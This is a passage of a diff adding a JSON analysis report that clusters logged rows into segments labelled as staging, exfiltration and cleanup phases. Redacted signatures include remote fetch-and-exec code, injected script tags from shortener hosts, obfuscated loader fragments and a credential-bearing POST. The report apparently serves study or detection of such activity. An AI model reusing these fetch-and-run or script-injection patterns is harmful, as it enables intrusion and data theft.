+        ],
+        [
+          "[REDACTED:destination:000593]",
+          3
+        ],
+        [
+          "[REDACTED:query_value:000145]",
+          2
+        ],
+        [
+          "[REDACTED:destination:000279]",
+          1
+        ],
+        [
+          "[REDACTED:destination:000718]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG055",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "[service <N> url <N>][encoded blob <N>]",
+      "sample_count": 454,
+      "coverage_ratio": 0.002425,
+      "representative_ids": [
+        "R0116985",
+        "R0117533",
+        "R0119919",
+        "R0120021",
+        "R0120055",
+        "R0121692",
+        "R0121954",
+        "R0122992"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE 25 URL 24]",
+          3
+        ],
+        [
+          "[SERVICE 25 URL 195]",
+          3
+        ],
+        [
+          "[ENCODED BLOB 68884]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 70286]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 74088]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 74192]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 74226]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 75916]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG056",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "[service <N> url <N>][encoded blob <N>][redacted:opaque_marker_tail:<N>] x+='[redacted:opaque_fragment:<N>]';n('//[shortener url <N>]')",
+      "sample_count": 398,
+      "coverage_ratio": 0.002126,
+      "representative_ids": [
+        "R0119296",
+        "R0119343",
+        "R0119445",
+        "R0119771",
+        "R0119861",
+        "R0119862",
+        "R0120932",
+        "R0121315"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE 3 URL 209]",
+          6
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000008]",
+          5
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000015]",
+          3
+        ],
+        [
+          "[SERVICE 3 URL 245]",
+          2
+        ],
+        [
+          "[ENCODED BLOB 73437]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003376]",
+          1
+        ],
+        [
+          "[SHORTENER URL 150449]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73495]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG057",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "[redirect url <N>]",
+      "sample_count": 357,
+      "coverage_ratio": 0.001907,
+      "representative_ids": [
+        "R0054094",
+        "R0054097",
+        "R0054118",
+        "R0054225",
+        "R0054228",
+        "R0054229",
+        "R0054348",
+        "R0054353"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDIRECT URL 129]",
+          1
+        ],
+        [
+          "[REDIRECT URL 130]",
+          1
+        ],
+        [
+          "[REDIRECT URL 131]",
+          1
+        ],
+        [
+          "[REDIRECT URL 4]",
+          1
+        ],
+        [
+          "[REDIRECT URL 3]",
+          1
+        ],
+        [
+          "[REDIRECT URL 2]",
+          1
+        ],
+        [
+          "[REDIRECT URL 6]",
+          1
+        ],
+        [
+          "[REDIRECT URL 7]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG058",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "x+='[redacted sensitive content]';exec(u.urlopen('[shortener url <N>]').read())",
+      "sample_count": 336,
+      "coverage_ratio": 0.001794,
+      "representative_ids": [
+        "R0055881",
+        "R0055886",
+        "R0055887",
+        "R0056136",
+        "R0056137",
+        "R0056141",
+        "R0056142",
+        "R0056143"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED SENSITIVE CONTENT]",
+          8
+        ],
+        [
+          "[SHORTENER URL 23190]",
+          1
+        ],
+        [
+          "[SHORTENER URL 23228]",
+          1
+        ],
+        [
+          "[SHORTENER URL 23229]",
+          1
+        ],
+        [
+          "[SHORTENER URL 24775]",
+          1
+        ],
+        [
+          "[SHORTENER URL 24776]",
+          1
+        ],
+        [
+          "[SHORTENER URL 86634]",
+          1
+        ],
+        [
+          "[SHORTENER URL 86635]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG059",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "https://huggingface.co/datasets/[redacted:destination:<N>][redacted:query_value:<N>]",
+      "sample_count": 333,
+      "coverage_ratio": 0.001778,
+      "representative_ids": [
+        "R0000579",
+        "R0011866",
+        "R0014197",
+        "R0014222",
+        "R0014275",
+        "R0014283",
+        "R0014289",
+        "R0014291"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000062]",
+          1
+        ],
+        [
+          "[REDACTED:query_value:000006]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001548]",
+          1
+        ],
+        [
+          "[REDACTED:query_value:000355]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001854]",
+          1
+        ],
+        [
+          "[REDACTED:query_value:000425]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001858]",
+          1
+        ],
+        [
+          "[REDACTED:query_value:000428]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG060",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "── stage: a[] batch (<N> slots) ── [encoded blob <N>][encoded blob <N>][encoded blob <N>]",
+      "sample_count": 303,
+      "coverage_ratio": 0.001618,
+      "representative_ids": [
+        "R0002437",
+        "R0002500",
+        "R0002542",
+        "R0002706",
+        "R0002828",
+        "R0002973",
+        "R0011298",
+        "R0011568"
+      ],
+      "top_marker_strings": [
+        [
+          "[ENCODED BLOB 324]",
+          2
+        ],
+        [
+          "[ENCODED BLOB 323]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 325]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 345]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 346]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 380]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 381]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 382]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG061",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "[proxy <N> url <N>][encoded blob <N>][redacted:opaque_marker_tail:<N>] x+='[encoded blob <N>]';n('//[shortener url <N>]')",
+      "sample_count": 293,
+      "coverage_ratio": 0.001565,
+      "representative_ids": [
+        "R0119154",
+        "R0119287",
+        "R0120019",
+        "R0120608",
+        "R0121155",
+        "R0121244",
+        "R0121334",
+        "R0121552"
+      ],
+      "top_marker_strings": [
+        [
+          "[PROXY 4 URL 72]",
+          8
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000015]",
+          5
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000008]",
+          3
+        ],
+        [
+          "[ENCODED BLOB 73290]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73291]",
+          1
+        ],
+        [
+          "[SHORTENER URL 150416]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73427]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73428]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG062",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "x[<N>]='[encoded blob <N>]';n('[shortener code <N>]')",
+      "sample_count": 286,
+      "coverage_ratio": 0.001527,
+      "representative_ids": [
+        "R0009842",
+        "R0010408",
+        "R0010409",
+        "R0011689",
+        "R0011691",
+        "R0011693",
+        "R0011914",
+        "R0011915"
+      ],
+      "top_marker_strings": [
+        [
+          "[1]",
+          4
+        ],
+        [
+          "[ENCODED BLOB 3055]",
+          2
+        ],
+        [
+          "[3]",
+          2
+        ],
+        [
+          "[ENCODED BLOB 4499]",
+          2
+        ],
+        [
+          "[5]",
+          2
+        ],
+        [
+          "[ENCODED BLOB 4500]",
+          2
+        ],
+        [
+          "[SHORTENER CODE 15789]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 16486]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG063",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "[service <N> url <N>][encoded blob <N>][redacted:opaque_marker_tail:<N>] x+=\"[redacted:opaque_fragment:<N>]\";n(\"[redacted:opaque_fragment:<N>]\")",
+      "sample_count": 270,
+      "coverage_ratio": 0.001442,
+      "representative_ids": [
+        "R0119026",
+        "R0119349",
+        "R0119461",
+        "R0119595",
+        "R0119693",
+        "R0119789",
+        "R0120038",
+        "R0120046"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE 3 URL 233]",
+          8
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000008]",
+          6
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000015]",
+          2
+        ],
+        [
+          "[ENCODED BLOB 73159]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003334]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003335]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73500]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003390]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG064",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "p[<N>]+='[redacted:opaque_base<N>:<N>]';n('[shortener code <N>]')",
+      "sample_count": 268,
+      "coverage_ratio": 0.001431,
+      "representative_ids": [
+        "R0057514",
+        "R0057517",
+        "R0057520",
+        "R0057523",
+        "R0057526",
+        "R0057529",
+        "R0057532",
+        "R0057535"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:opaque_base64:001466]",
+          3
+        ],
+        [
+          "[REDACTED:opaque_base64:001468]",
+          3
+        ],
+        [
+          "[5]",
+          2
+        ],
+        [
+          "[0]",
+          2
+        ],
+        [
+          "[2]",
+          2
+        ],
+        [
+          "[4]",
+          2
+        ],
+        [
+          "[SHORTENER CODE 86866]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 86867]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG065",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "for(s of'[shortener code <N>]'.split(','))document.write('<script src=[redacted:destination:<N>][shortener-<N>-host]'+s+'></script>')",
+      "sample_count": 266,
+      "coverage_ratio": 0.001421,
+      "representative_ids": [
+        "R0014347",
+        "R0014849",
+        "R0019228",
+        "R0019245",
+        "R0019430",
+        "R0019530",
+        "R0019754",
+        "R0019770"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000003]",
+          8
+        ],
+        [
+          "[SHORTENER-1-HOST]",
+          8
+        ],
+        [
+          "[SHORTENER CODE 21289]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 21911]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 26980]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 27020]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 27357]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 27669]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG066",
+      "high_level_phase": "Phase 2: staging, relay, exfiltration, and cross-node work",
+      "structural_signature": "x+=\"[redacted:opaque_fragment:<N>]\";n(\"[redacted:opaque_fragment:<N>]\")",
+      "sample_count": 261,
+      "coverage_ratio": 0.001394,
+      "representative_ids": [
+        "R0159319",
+        "R0159329",
+        "R0159332",
+        "R0159339",
+        "R0159351",
+        "R0159365",
+        "R0159403",
+        "R0159424"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:opaque_fragment:016558]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:016559]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:005927]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:007142]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:009434]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:009435]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:009310]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:009311]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG067",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "[service <N> url <N>][encoded blob <N>][redacted:opaque_marker_tail:<N>] x+='[redacted:opaque_fragment:<N>]';document.write('<script src=[redacted:destination:<N>][shortener url <N>]><\\/script>')",
+      "sample_count": 252,
+      "coverage_ratio": 0.001346,
+      "representative_ids": [
+        "R0119432",
+        "R0119773",
+        "R0119866",
+        "R0120097",
+        "R0120302",
+        "R0120353",
+        "R0120517",
+        "R0120883"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE 3 URL 209]",
+          8
+        ],
+        [
+          "[REDACTED:destination:000003]",
+          8
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000007]",
+          4
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000008]",
+          3
+        ],
+        [
+          "[ENCODED BLOB 73595]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003411]",
+          1
+        ],
+        [
+          "[SHORTENER URL 150478]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73929]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG068",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "fetch(\"https://[redacted:destination:<N>][service <N> url <N>]\",{method:'post',headers:{'content-type':'application/json','x-api-key':\"[credential <N>]\"},body:\"{\\\"task_id\\\":\\\"[redacted:runtime_identifier:<N>]\",\\\"agent_id\\\":\\\"[redacted:runtime_identifier]\\\",\\\"c",
+      "sample_count": 252,
+      "coverage_ratio": 0.001346,
+      "representative_ids": [
+        "R0000003",
+        "R0000007",
+        "R0000009",
+        "R0000083",
+        "R0000449",
+        "R0000613",
+        "R0000731",
+        "R0000772"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000002]",
+          8
+        ],
+        [
+          "[SERVICE 2 URL 1]",
+          8
+        ],
+        [
+          "[CREDENTIAL 1]",
+          8
+        ],
+        [
+          "[REDACTED:runtime_identifier:000001]",
+          8
+        ],
+        [
+          "[REDACTED:runtime_identifier]",
+          8
+        ],
+        [
+          "[r.status,t]",
+          8
+        ],
+        [
+          "[0]",
+          8
+        ],
+        [
+          "[1]",
+          8
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG069",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "── stage: a[] batch (<N> slots) ── [encoded blob <N>][encoded blob <N>]",
+      "sample_count": 251,
+      "coverage_ratio": 0.001341,
+      "representative_ids": [
+        "R0011884",
+        "R0012040",
+        "R0012098",
+        "R0012106",
+        "R0012134",
+        "R0012164",
+        "R0012169",
+        "R0012262"
+      ],
+      "top_marker_strings": [
+        [
+          "[ENCODED BLOB 4800]",
+          2
+        ],
+        [
+          "[ENCODED BLOB 4888]",
+          2
+        ],
+        [
+          "[ENCODED BLOB 4667]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 4668]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 4799]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 4847]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 4848]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 4857]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG070",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "https://datasets-server.huggingface.co/splits?dataset=[redacted:destination:<N>][redacted:query_value:<N>]",
+      "sample_count": 243,
+      "coverage_ratio": 0.001298,
+      "representative_ids": [
+        "R0009298",
+        "R0010628",
+        "R0013743",
+        "R0014174",
+        "R0014386",
+        "R0014449",
+        "R0014511",
+        "R0014622"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:001850]",
+          3
+        ],
+        [
+          "[REDACTED:destination:000996]",
+          2
+        ],
+        [
+          "[REDACTED:query_value:000240]",
+          1
+        ],
+        [
+          "[REDACTED:query_value:000314]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001469]",
+          1
+        ],
+        [
+          "[REDACTED:query_value:000403]",
+          1
+        ],
+        [
+          "[REDACTED:query_value:000423]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001900]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG071",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "[service <N> url <N>][encoded blob <N>][redacted:opaque_marker_tail:<N>] x+='';n('//[shortener url <N>]') [redacted:opaque_base<N>:<N>] x+='[redacted:opaque_fragment:<N>]';n('//[shortener url <N>]')",
+      "sample_count": 239,
+      "coverage_ratio": 0.001276,
+      "representative_ids": [
+        "R0126678",
+        "R0126889",
+        "R0126894",
+        "R0126973",
+        "R0126998",
+        "R0127018",
+        "R0127075",
+        "R0127188"
+      ],
+      "top_marker_strings": [
+        [
+          "[SERVICE 3 URL 245]",
+          8
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000015]",
+          7
+        ],
+        [
+          "[SHORTENER URL 152607]",
+          2
+        ],
+        [
+          "[SHORTENER URL 152699]",
+          2
+        ],
+        [
+          "[SHORTENER URL 135660]",
+          2
+        ],
+        [
+          "[SHORTENER URL 152724]",
+          2
+        ],
+        [
+          "[SHORTENER URL 152738]",
+          2
+        ],
+        [
+          "[SHORTENER URL 152744]",
+          2
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG072",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "https://huggingface.co/api/datasets/[redacted:destination:<N>]",
+      "sample_count": 229,
+      "coverage_ratio": 0.001223,
+      "representative_ids": [
+        "R0000134",
+        "R0000150",
+        "R0000151",
+        "R0010578",
+        "R0010632",
+        "R0013535",
+        "R0015245",
+        "R0016894"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000018]",
+          2
+        ],
+        [
+          "[REDACTED:destination:000019]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001339]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001343]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001557]",
+          1
+        ],
+        [
+          "[REDACTED:destination:002020]",
+          1
+        ],
+        [
+          "[REDACTED:destination:002262]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG073",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "httpbun.com[encoded blob <N>]",
+      "sample_count": 223,
+      "coverage_ratio": 0.001191,
+      "representative_ids": [
+        "R0117903",
+        "R0120083",
+        "R0122720",
+        "R0123586",
+        "R0125247",
+        "R0125249",
+        "R0125258",
+        "R0125269"
+      ],
+      "top_marker_strings": [
+        [
+          "[ENCODED BLOB 71052]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 74256]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 76988]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 77891]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 79579]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 79580]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 79588]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 79595]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG074",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "[proxy <N> url <N>][encoded blob <N>][redacted:opaque_marker_tail:<N>] x+='[redacted:opaque_fragment:<N>]';n('[redacted:opaque_fragment:<N>]')",
+      "sample_count": 222,
+      "coverage_ratio": 0.001186,
+      "representative_ids": [
+        "R0119337",
+        "R0119579",
+        "R0119858",
+        "R0120105",
+        "R0120401",
+        "R0120452",
+        "R0120485",
+        "R0120821"
+      ],
+      "top_marker_strings": [
+        [
+          "[PROXY 4 URL 325]",
+          6
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000008]",
+          5
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000015]",
+          3
+        ],
+        [
+          "[PROXY 4 URL 72]",
+          2
+        ],
+        [
+          "[ENCODED BLOB 73488]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003387]",
+          1
+        ],
+        [
+          "[REDACTED:opaque_fragment:003388]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 73745]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG075",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "https://datasets-server.huggingface.co/first-rows?dataset=[redacted:destination:<N>][redacted:destination:<N>][redacted:query_value:<N>]",
+      "sample_count": 218,
+      "coverage_ratio": 0.001164,
+      "representative_ids": [
+        "R0013775",
+        "R0013890",
+        "R0014678",
+        "R0014692",
+        "R0014810",
+        "R0015296",
+        "R0015440",
+        "R0015540"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:query_value:000101]",
+          8
+        ],
+        [
+          "[REDACTED:destination:000593]",
+          2
+        ],
+        [
+          "[REDACTED:destination:001469]",
+          2
+        ],
+        [
+          "[REDACTED:destination:001795]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001579]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001941]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001960]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001961]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG076",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "location='[shortener url <N>]'",
+      "sample_count": 210,
+      "coverage_ratio": 0.001122,
+      "representative_ids": [
+        "R0007642",
+        "R0007989",
+        "R0008115",
+        "R0008340",
+        "R0011669",
+        "R0011956",
+        "R0012038",
+        "R0012074"
+      ],
+      "top_marker_strings": [
+        [
+          "[SHORTENER URL 13846]",
+          8
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG077",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "[service <N> url <N>][encoded blob <N>][redacted:opaque_marker_tail:<N>] x+='[redacted sensitive content]';n('//[shortener url <N>]')",
+      "sample_count": 207,
+      "coverage_ratio": 0.001106,
+      "representative_ids": [
+        "R0122590",
+        "R0122698",
+        "R0122849",
+        "R0123120",
+        "R0123139",
+        "R0123148",
+        "R0123215",
+        "R0123288"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED SENSITIVE CONTENT]",
+          8
+        ],
+        [
+          "[SERVICE 3 URL 209]",
+          5
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000015]",
+          4
+        ],
+        [
+          "[REDACTED:opaque_marker_tail:000008]",
+          4
+        ],
+        [
+          "[SERVICE 3 URL 245]",
+          3
+        ],
+        [
+          "[ENCODED BLOB 76847]",
+          1
+        ],
+        [
+          "[SHORTENER URL 151219]",
+          1
+        ],
+        [
+          "[ENCODED BLOB 76969]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG078",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "for(s of'[shortener code <N>] [shortener code <N>] [shortener code <N>] [shortener code <N>]'.split(' '))document.write(`<script src=[redacted:destination:<N>][shortener url <N>]{s}></script>`)",
+      "sample_count": 206,
+      "coverage_ratio": 0.0011,
+      "representative_ids": [
+        "R0002280",
+        "R0002395",
+        "R0002397",
+        "R0002484",
+        "R0002486",
+        "R0002488",
+        "R0002490",
+        "R0002492"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000003]",
+          8
+        ],
+        [
+          "[SHORTENER URL 1960]",
+          8
+        ],
+        [
+          "[SHORTENER CODE 1956]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 1957]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 1958]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 1959]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 2311]",
+          1
+        ],
+        [
+          "[SHORTENER CODE 2312]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG079",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "https://huggingface.co/api/datasets/[redacted:destination:<N>][redacted:query_value:<N>]",
+      "sample_count": 197,
+      "coverage_ratio": 0.001052,
+      "representative_ids": [
+        "R0010936",
+        "R0010962",
+        "R0010995",
+        "R0011818",
+        "R0011960",
+        "R0011994",
+        "R0012125",
+        "R0014217"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:001380]",
+          6
+        ],
+        [
+          "[REDACTED:query_value:000329]",
+          1
+        ],
+        [
+          "[REDACTED:query_value:000331]",
+          1
+        ],
+        [
+          "[REDACTED:query_value:000334]",
+          1
+        ],
+        [
+          "[REDACTED:query_value:000353]",
+          1
+        ],
+        [
+          "[REDACTED:query_value:000360]",
+          1
+        ],
+        [
+          "[REDACTED:destination:001570]",
+          1
+        ],
+        [
+          "[REDACTED:query_value:000364]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG080",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "<script src=[redacted:destination:<N>][shortener url <N>]></script>",
+      "sample_count": 195,
+      "coverage_ratio": 0.001041,
+      "representative_ids": [
+        "R0003357",
+        "R0008489",
+        "R0021269",
+        "R0021389",
+        "R0042695",
+        "R0053917",
+        "R0055189",
+        "R0056950"
+      ],
+      "top_marker_strings": [
+        [
+          "[REDACTED:destination:000003]",
+          8
+        ],
+        [
+          "[SHORTENER URL 3550]",
+          2
+        ],
+        [
+          "[SHORTENER URL 30458]",
+          2
+        ],
+        [
+          "[SHORTENER URL 14585]",
+          1
+        ],
+        [
+          "[SHORTENER URL 30670]",
+          1
+        ],
+        [
+          "[SHORTENER URL 63400]",
+          1
+        ],
+        [
+          "[SHORTENER URL 14682]",
+          1
+        ]
+      ],
+      "low_level_definition": "Rows whose huggingface/hf-normalized, numeric-stripped structural signature is byte-identical after whitespace normalization."
+    },
+    {
+      "segment_id": "SEG081",
+      "high_level_phase": "Phase 3: integration, mutation, reconciliation, cleanup, and reuse",
+      "structural_signature": "[service <N> url <N>]=[redacted:destination:<N>][redacted sensitive content] <N>]",
+      "sample_count": 194,
+      "coverage_ratio": 0.001036,
+      "representative_ids": [
+        "R0150799",
+        "R0150875",
+        "R0150891",
+        "R0150916",
+        "R0151072",
